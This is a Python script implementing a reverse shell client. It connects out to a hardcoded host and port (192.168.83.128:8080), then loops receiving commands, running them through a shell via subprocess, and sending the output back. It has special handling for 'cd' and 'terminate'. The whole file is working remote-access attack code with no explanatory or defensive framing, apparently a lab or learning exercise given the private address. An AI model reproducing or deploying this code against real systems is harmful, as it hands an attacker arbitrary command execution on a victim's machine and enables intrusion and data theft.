import socket
import os
import subprocess

def connect():
    mySocket = socket.socket()  # Initialize socket object
    try:
        mySocket.connect(("192.168.83.128", 8080))  # Connect to server IP and port
        print("Connection established with server")
        shell(mySocket)  # Call the shell function after connecting
    except ConnectionRefusedError:
        print("Cannot connect to server. Make sure the server is running and the IP/port are correct.")
    except Exception as e:
        print(f"Connection error: {e}")

def shell(mySocket):
    while True:
        try:
            command = mySocket.recv(5000)
            if not command:  # If empty data is received, connection might be closed
                print("Connection lost")
                break
                
            if "terminate" in command.decode():
                try:
                    mySocket.close()
                    break
                except Exception as e:
                    informToServer = "!ERR!: " + str(e)
                    mySocket.send(informToServer.encode())
                    break
            elif 'cd' in command.decode():
                try:
                    code, directory = command.decode().split(" ", 1)
                    os.chdir(directory)
                    informToServer = "Current Working Directory is: " + os.getcwd()
                    mySocket.send(informToServer.encode())
                except Exception as e:
                    informToServer = "!ERR!: " + str(e)
                    mySocket.send(informToServer.encode())
            else:
                cmd = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                mySocket.send(cmd.stdout.read())
                mySocket.send(cmd.stderr.read())
        except Exception as e:
            print(f"Error in shell: {e}")
            break
    
    # Always close the socket when done
    try:
        mySocket.close()
    except:
        pass

def main():
    connect()

if __name__ == "__main__":
    main()
